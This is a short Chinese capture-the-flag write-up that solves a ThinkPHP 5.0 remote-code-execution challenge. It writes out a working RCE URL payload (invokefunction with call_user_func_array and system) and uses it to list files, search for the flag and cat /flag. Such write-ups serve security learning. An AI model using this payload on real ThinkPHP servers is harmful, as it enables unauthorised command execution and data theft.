# php_rce

本题显示信息: 版本 `ThinkPHP V5.0`.

因为题目是 `php rce`, 上网查一些关于 `ThinkPHP RCE payload`, 找到 [https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection). 我用的是 `thinkphp 5.0.21` 的 `payload`:

`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=`

我们可以执行任何命令在最后的等于符号后面.

用 `ls` 命令: `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls` 查看所在 `path` 有哪些文件, 但没有收获.

于是我试着用 `find` 命令 `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20flag` 寻找字 `flag`, 得到 `flag` 在 `/flag` 文件中.

最后只需要直接读 `flag` 文件: `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag`
